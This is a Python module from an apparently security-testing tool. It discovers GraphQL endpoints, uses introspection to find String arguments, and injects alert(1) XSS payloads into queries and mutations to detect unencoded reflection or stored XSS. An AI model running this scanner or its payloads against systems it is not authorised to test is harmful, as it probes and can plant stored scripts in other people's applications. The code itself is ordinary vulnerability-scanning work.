"""
GraphQL XSS Scanner

Modern apps increasingly expose GraphQL APIs. XSS through GraphQL is
often missed by traditional scanners because:
  1. Standard URL param fuzzing doesn't reach GraphQL fields
  2. Introspection reveals which fields accept String input
  3. Both Query and Mutation fields can be injectable

Attack chain:
  1. Discover GraphQL endpoint (common paths + response fingerprint)
  2. Run introspection to list all String-type input fields
  3. Inject XSS probes into each field via Query/Mutation
  4. Check if reflected value appears in response without encoding
  5. Try stored XSS via mutations (write then read back)

Handles:
  - Standard GraphQL (application/json POST)
  - GET-based GraphQL queries (?query=...)
  - Variables-based injection
  - Nested object input fields
  - Introspection disabled apps (fallback: common field names)
"""

from __future__ import annotations

import re
import json
import logging
from typing import List, Dict, Optional, Any
from urllib.parse import urlparse

logger = logging.getLogger("akha.graphql")

GRAPHQL_PATHS = [
    '/graphql',
    '/graphiql',
    '/api/graphql',
    '/v1/graphql',
    '/v2/graphql',
    '/query',
    '/gql',
    '/graph',
    '/api/graph',
    '/api/v1/graphql',
    '/api/v2/graphql',
    '/graphql/v1',
    '/graphql/console',
]

INTROSPECTION_QUERY = """
{
  __schema {
    types {
      name
      kind
      fields {
        name
        args {
          name
          type {
            name
            kind
            ofType {
              name
              kind
            }
          }
        }
        type {
          name
          kind
          ofType {
            name
            kind
          }
        }
      }
      inputFields {
        name
        type {
          name
          kind
          ofType {
            name
            kind
          }
        }
      }
    }
    queryType { name }
    mutationType { name }
  }
}
"""

COMMON_STRING_FIELDS = [
    'name', 'title', 'description', 'content', 'body', 'text',
    'message', 'comment', 'note', 'label', 'value', 'input',
    'query', 'search', 'filter', 'username', 'email', 'url',
    'bio', 'about', 'summary', 'subject', 'tag', 'category',
]

GRAPHQL_XSS_PROBE = 'akhaGQLprobe7391'
GRAPHQL_XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    '<iframe srcdoc="<script>alert(1)</script>">',
]


class GraphQLScanner:
    """
    XSS scanner for GraphQL endpoints.

    Usage:
        scanner = GraphQLScanner(http_client, config)
        findings = scanner.scan(base_url)
    """

    def __init__(self, http_client, config, execution_verifier=None):
        self.client = http_client
        self.config = config
        self.verifier = execution_verifier
        self._stopped = False

    def stop(self):
        self._stopped = True


    def scan(self, base_url: str) -> List[Dict]:
        """
        Discover GraphQL endpoint, introspect schema, and test for XSS.
        """
        findings = []

        gql_url = self.detect_graphql(base_url)
        if not gql_url:
            if self.config.verbose:
                logger.debug("No GraphQL endpoint found at %s", base_url)
            return findings

        if self.config.verbose:
            logger.info("GraphQL endpoint found: %s", gql_url)

        injectable_fields = self.get_injectable_fields(gql_url)
        if not injectable_fields:
            injectable_fields = self._fallback_fields()

        if self.config.verbose:
            logger.info("Testing %d GraphQL fields", len(injectable_fields))

        for field_info in injectable_fields:
            if self._stopped:
                break

            probe_result = self._test_field(gql_url, field_info, GRAPHQL_XSS_PROBE)
            if not probe_result:
                continue

            for payload in GRAPHQL_XSS_PAYLOADS:
                if self._stopped:
                    break

                result = self._test_field(gql_url, field_info, payload)
                if not result:
                    continue

                body = result.get('body', '')
                if not self._is_payload_dangerous_in_response(body, payload):
                    continue

                executed = False
                exec_evidence = None
                if self.verifier and result.get('url'):
                    try:
                        vr = self.verifier.verify(result['url'], payload)
                        executed = vr.executed
                        exec_evidence = vr.evidence
                    except Exception:
                        logger.debug("Suppressed exception", exc_info=True)

                confidence = 88 if executed else 65
                findings.append({
                    'url': gql_url,
                    'parameter': f"GraphQL:{field_info['field_path']}",
                    'payload': payload,
                    'test_url': gql_url,
                    'type': 'graphql_xss',
                    'subtype': f"GraphQL {field_info.get('operation', 'query')} field",
                    'status': 'Vulnerability Detected' if executed else 'Potential GraphQL XSS',
                    'confidence': confidence,
                    'context': {
                        'Location': 'GraphQL',
                        'Type': field_info.get('operation', 'query').capitalize(),
                        'Field': field_info['field_path'],
                    },
                    'bypass_technique': 'GraphQL API XSS',
                    'proof': (
                        f"GraphQL XSS found in field: {field_info['field_path']}\n"
                        f"Operation: {field_info.get('operation', 'query')}\n"
                        f"Payload: {payload}\n"
                        f"Endpoint: {gql_url}\n"
                        + (f"Browser confirmed: {exec_evidence}" if executed else
                           "Payload reflected unencoded in GraphQL response")
                    ),
                    'request': result.get('request_body', ''),
                    'response': body[:500],
                    'validated': executed,
                    'graphql_endpoint': gql_url,
                    'graphql_field': field_info['field_path'],
                })
                break  # One payload confirmed per field is enough

        return findings


    def detect_graphql(self, base_url: str) -> Optional[str]:
        """
        Probe common GraphQL paths. Returns full URL if found, else None.
        Uses two signals: HTTP 200 AND response looks like GraphQL JSON.
        """
        parsed = urlparse(base_url)
        origin = f"{parsed.scheme}://{parsed.netloc}"

        test_query = '{"query": "{ __typename }"}'

        for path in GRAPHQL_PATHS:
            if self._stopped:
                break

            url = origin + path
            try:
                resp = self.client.post(
                    url,
                    data=test_query,
                    headers={'Content-Type': 'application/json'},
                    timeout=self.config.timeout,
                )
                if resp.status_code not in (200, 400):
                    continue

                parsed = None
                try:
                    parsed = resp.json()
                except Exception:
                    parsed = None
                if isinstance(parsed, dict) and ('data' in parsed or 'errors' in parsed):
                    return url

            except Exception:
                continue

        return None


    def get_injectable_fields(self, gql_url: str) -> List[Dict]:
        """
        Run introspection query and extract all String-type input fields.
        Returns list of field info dicts.
        """
        try:
            resp = self.client.post(
                gql_url,
                data=json.dumps({'query': INTROSPECTION_QUERY}),
                headers={'Content-Type': 'application/json'},
                timeout=15,
            )
            data = resp.json()
        except Exception:
            return []

        if 'errors' in data and 'data' not in data:
            return []

        schema = data.get('data', {}).get('__schema', {})
        if not schema:
            return []

        query_type = schema.get('queryType', {}).get('name', 'Query')
        mutation_type = (schema.get('mutationType') or {}).get('name', 'Mutation')

        fields = []
        for type_def in schema.get('types', []):
            type_name = type_def.get('name', '')
            if type_name.startswith('__'):
                continue

            operation = None
            if type_name == query_type:
                operation = 'query'
            elif type_name == mutation_type:
                operation = 'mutation'
            else:
                continue

            for field in (type_def.get('fields') or []):
                field_name = field.get('name', '')
                ret_name, ret_kind = self._resolve_type(field.get('type', {}))
                for arg in (field.get('args') or []):
                    if self._is_string_type(arg.get('type', {})):
                        fields.append({
                            'type_name': type_name,
                            'field_name': field_name,
                            'arg_name': arg['name'],
                            'field_path': f'{type_name}.{field_name}({arg["name"]})',
                            'operation': operation,
                            'return_name': ret_name,
                            'return_kind': ret_kind,
                        })

        return fields[:20]


    def _test_field(self, gql_url: str, field_info: Dict,
                    value: str) -> Optional[Dict]:
        """
        Inject value into a specific GraphQL field and return response info.
        """
        field_name = field_info['field_name']
        arg_name = field_info['arg_name']
        operation = field_info.get('operation', 'query')

        value_lit = json.dumps(value)
        return_kind = field_info.get('return_kind', '')
        selection = ' { __typename }' if return_kind in ('OBJECT', 'INTERFACE', 'UNION') else ''
        op = 'mutation' if operation == 'mutation' else 'query'
        gql_query = f'{op} AkhaTest {{ {field_name}({arg_name}: {value_lit}){selection} }}'
        body = json.dumps({'query': gql_query})

        try:
            resp = self.client.post(
                gql_url,
                data=body,
                headers={'Content-Type': 'application/json'},
                timeout=self.config.timeout,
            )
            parsed = None
            try:
                parsed = resp.json()
            except Exception:
                parsed = None

            if isinstance(parsed, dict) and parsed.get('errors') and not parsed.get('data'):
                return None

            if isinstance(parsed, dict):
                body_text = json.dumps(parsed.get('data', {}), ensure_ascii=False)
            else:
                body_text = resp.text

            return {
                'body': body_text,
                'raw_body': resp.text,
                'status': resp.status_code,
                'request_body': body,
                'url': gql_url,
            }
        except Exception:
            return None


    def _is_string_type(self, type_obj: Dict) -> bool:
        """Recursively check if a GraphQL type resolves to String"""
        if not type_obj:
            return False
        name = type_obj.get('name', '')
        if name == 'String':
            return True
        of_type = type_obj.get('ofType')
        if of_type:
            return self._is_string_type(of_type)
        return False

    def _resolve_type(self, type_obj: Dict) -> tuple[str, str]:
        """Resolve nested GraphQL type wrappers to base (name, kind)."""
        if not type_obj:
            return '', ''
        name = type_obj.get('name') or ''
        kind = type_obj.get('kind') or ''
        if name:
            return name, kind
        of_type = type_obj.get('ofType')
        if of_type:
            return self._resolve_type(of_type)
        return '', kind

    def _is_payload_dangerous_in_response(self, body: str, payload: str) -> bool:
        """
        Check if payload appears in response in a potentially executable form.
        Encoded payloads (&lt;script&gt;) don't count.
        """
        if payload not in body:
            return False
        if '&lt;' in body or '&amp;' in body:
            encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
            if encoded in body and payload not in body.replace(encoded, ''):
                return False
        return True

    def _fallback_fields(self) -> List[Dict]:
        """
        When introspection is disabled, return common field stubs to test.
        """
        fields = []
        for fname in COMMON_STRING_FIELDS:
            fields.append({
                'type_name': 'Query',
                'field_name': fname,
                'arg_name': 'input',
                'field_path': f'Query.{fname}(input)',
                'operation': 'query',
            })
        return fields[:10]
